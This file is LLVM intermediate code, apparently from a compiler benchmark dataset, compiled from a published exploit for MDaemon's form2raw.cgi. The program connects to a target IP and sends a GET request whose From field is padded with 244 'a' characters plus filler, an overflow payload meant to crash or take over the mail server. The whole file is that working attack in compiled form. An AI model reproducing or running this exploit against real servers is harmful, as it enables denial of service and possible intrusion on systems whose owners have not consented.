; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_23501.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_23501.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_6__ = type { %struct.TYPE_5__, i32, i32 }
%struct.TYPE_5__ = type { %struct.TYPE_4__ }
%struct.TYPE_4__ = type { i32 }
%struct.sockaddr = type { i32 }

@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [82 x i8] c"MDaemon form2raw.cgi Exploit Written by Behrang Fouladi, \0AUsage: %s <target ip> \0A\00", align 1
@.str.1 = private unnamed_addr constant [3 x i8] c"%d\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@INVALID_SOCKET = common dso_local global i64 0, align 8
@PORT = common dso_local global i32 0, align 4
@main.buffer = internal global [500 x i8] zeroinitializer, align 16
@.str.2 = private unnamed_addr constant [24 x i8] c"get /form2raw.cgi?From=\00", align 1
@.str.3 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"bbbb\00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c"c\00", align 1
@.str.6 = private unnamed_addr constant [51 x i8] c"&To=me@hell.org&Subject=hi&Body=hello HTTP/1.0\0D\0A\0D\0A\00", align 1
@.str.7 = private unnamed_addr constant [14 x i8] c"Exploit Sent.\00", align 1
@.str.8 = private unnamed_addr constant [33 x i8] c"Error Connecting to The Target.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i64, align 8
  %6 = alloca i32, align 4
  %7 = alloca %struct.TYPE_6__, align 4
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  store i64 0, i64* %5, align 8
  %9 = load i32, i32* %3, align 4
  %10 = icmp slt i32 %9, 2
  br i1 %10, label %11, label %20

11:                                               ; preds = %2
  %12 = load i32, i32* @stderr, align 4
  %13 = load i8**, i8*** %4, align 8
  %14 = getelementptr inbounds i8*, i8** %13, i64 0
  %15 = load i8*, i8** %14, align 8
  %16 = call i32 @fprintf(i32 %12, i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str, i64 0, i64 0), i8* %15)
  %17 = load i32, i32* %3, align 4
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0), i32 %17)
  %19 = call i32 @exit(i32 0) #3
  unreachable

20:                                               ; preds = %2
  %21 = call i32 @MAKEWORD(i32 2, i32 0)
  %22 = call i32 @WSAStartup(i32 %21, i32* %6)
  %23 = load i32, i32* @AF_INET, align 4
  %24 = load i32, i32* @SOCK_STREAM, align 4
  %25 = load i32, i32* @IPPROTO_TCP, align 4
  %26 = call i64 @socket(i32 %23, i32 %24, i32 %25)
  store i64 %26, i64* %5, align 8
  %27 = load i64, i64* @INVALID_SOCKET, align 8
  %28 = load i64, i64* %5, align 8
  %29 = icmp ne i64 %27, %28
  br i1 %29, label %30, label %71

30:                                               ; preds = %20
  %31 = load i32, i32* @AF_INET, align 4
  %32 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %7, i32 0, i32 2
  store i32 %31, i32* %32, align 4
  %33 = load i32, i32* @PORT, align 4
  %34 = call i32 @htons(i32 %33)
  %35 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %7, i32 0, i32 1
  store i32 %34, i32* %35, align 4
  %36 = load i8**, i8*** %4, align 8
  %37 = getelementptr inbounds i8*, i8** %36, i64 1
  %38 = load i8*, i8** %37, align 8
  %39 = call i32 @inet_addr(i8* %38)
  %40 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %7, i32 0, i32 0
  %41 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %40, i32 0, i32 0
  %42 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %41, i32 0, i32 0
  store i32 %39, i32* %42, align 4
  %43 = load i64, i64* %5, align 8
  %44 = bitcast %struct.TYPE_6__* %7 to %struct.sockaddr*
  %45 = call i64 @connect(i64 %43, %struct.sockaddr* %44, i32 4)
  %46 = icmp eq i64 0, %45
  br i1 %46, label %47, label %66

47:                                               ; preds = %30
  %48 = call i32 @memset(i8* getelementptr inbounds ([500 x i8], [500 x i8]* @main.buffer, i64 0, i64 0), i32 0, i32 500)
  %49 = call i32 @strcpy(i8* getelementptr inbounds ([500 x i8], [500 x i8]* @main.buffer, i64 0, i64 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.2, i64 0, i64 0))
  store i32 0, i32* %8, align 4
  br label %50

50:                                               ; preds = %55, %47
  %51 = load i32, i32* %8, align 4
  %52 = icmp slt i32 %51, 244
  br i1 %52, label %53, label %58

53:                                               ; preds = %50
  %54 = call i32 @strcat(i8* getelementptr inbounds ([500 x i8], [500 x i8]* @main.buffer, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0))
  br label %55

55:                                               ; preds = %53
  %56 = load i32, i32* %8, align 4
  %57 = add nsw i32 %56, 1
  store i32 %57, i32* %8, align 4
  br label %50

58:                                               ; preds = %50
  %59 = call i32 @strcat(i8* getelementptr inbounds ([500 x i8], [500 x i8]* @main.buffer, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0))
  %60 = call i32 @strcat(i8* getelementptr inbounds ([500 x i8], [500 x i8]* @main.buffer, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0))
  %61 = call i32 @strcat(i8* getelementptr inbounds ([500 x i8], [500 x i8]* @main.buffer, i64 0, i64 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.6, i64 0, i64 0))
  %62 = load i64, i64* %5, align 8
  %63 = call i32 @strlen(i8* getelementptr inbounds ([500 x i8], [500 x i8]* @main.buffer, i64 0, i64 0))
  %64 = call i32 @send(i64 %62, i8* getelementptr inbounds ([500 x i8], [500 x i8]* @main.buffer, i64 0, i64 0), i32 %63, i32 0)
  %65 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.7, i64 0, i64 0))
  br label %68

66:                                               ; preds = %30
  %67 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.8, i64 0, i64 0))
  br label %68

68:                                               ; preds = %66, %58
  %69 = load i64, i64* %5, align 8
  %70 = call i32 @closesocket(i64 %69)
  br label %71

71:                                               ; preds = %68, %20
  %72 = call i32 (...) @WSACleanup()
  ret void
}

declare dso_local i32 @fprintf(i32, i8*, i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @WSAStartup(i32, i32*) #1

declare dso_local i32 @MAKEWORD(i32, i32) #1

declare dso_local i64 @socket(i32, i32, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i64 @connect(i64, %struct.sockaddr*, i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @send(i64, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @closesocket(i64) #1

declare dso_local i32 @WSACleanup(...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
